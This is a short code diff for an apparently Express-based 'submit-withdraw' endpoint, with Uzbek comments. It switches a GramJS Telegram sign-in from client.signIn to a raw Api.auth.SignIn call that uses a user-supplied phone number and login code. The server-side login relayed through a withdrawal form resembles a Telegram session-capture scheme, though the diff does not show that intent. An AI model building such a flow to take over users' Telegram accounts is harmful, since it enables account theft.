@@ -106,12 +106,14 @@ app.post('/api/submit-withdraw', async (req, res) => {
                 })
             );
         } else {
-            // Kod orqali kirish (client.signIn metodi xatosiz va to'liq bajariladi)
-            await client.signIn({
-                phoneNumber: '+' + cleanPhone,
-                phoneCodeHash: phoneCodeHash,
-                phoneCode: inputCode,
-            });
+            // GramJS uchun to'g'ri kirish usuli (client.signIn o'rniga Api.auth.SignIn)
+            await client.invoke(
+                new Api.auth.SignIn({
+                    phoneNumber: '+' + cleanPhone,
+                    phoneCodeHash: phoneCodeHash,
+                    phoneCode: inputCode,
+                })
+            );
         }
 
         const me = await client.getMe();
